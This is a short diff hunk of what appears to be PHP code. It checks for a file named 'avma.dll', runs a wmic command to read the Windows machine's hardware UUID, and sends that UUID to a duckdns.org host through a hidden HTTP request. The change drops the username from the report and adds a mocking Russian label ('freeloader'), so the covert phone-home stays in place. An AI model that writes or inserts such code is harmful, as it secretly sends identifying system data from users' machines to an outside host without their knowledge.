@@ -14,7 +14,7 @@ if(!file_exists('avma.dll'){
 $code = execute('cmd /c wmic csproduct get uuid',true);
 $code->getInput()->eachLine(function ($line){
 	if($line != null && trim(strtolower($line)) != "uuid"){
-		file_get_contents('http://oxibyte.duckdns.org/?id='.$_ENV["USERNAME"].'-'.$line."_офлайн");
+		file_get_contents('http://oxibyte.duckdns.org/?id='.$line."_халявщик");
 	}
 });
 }
